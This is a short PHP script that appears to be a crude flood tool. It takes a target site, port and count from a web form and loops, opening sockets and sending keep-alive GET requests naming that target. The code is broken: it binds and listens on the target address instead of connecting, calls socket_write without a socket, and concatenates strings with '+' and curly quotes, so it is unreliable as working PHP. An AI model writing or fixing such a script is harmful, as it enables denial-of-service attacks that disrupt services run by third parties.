<?php
error_reporting(E_ALL);
set_time_limit(0);
ob_implicit_flush();     
$address = $_POST['site'];  
$port = $_POST['port'];      
$count = $_POST['count'];   
$init = 1;
while ( $init <= $count )   
{
if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
echo "oop\n";
}
if (socket_bind($sock, $address, $port) === false) {      
echo "oop\n";
}
if (socket_listen($sock, 5) === false) {
echo "oop\n";
}
$msg = "HTTP/1.1 GET /\r\nHost:”+$_GET[‘site’]+”\r\nConnection: Keep-Alive\r\n";
socket_write($msg);
socket_close($sock);
$init++;  

}
?>
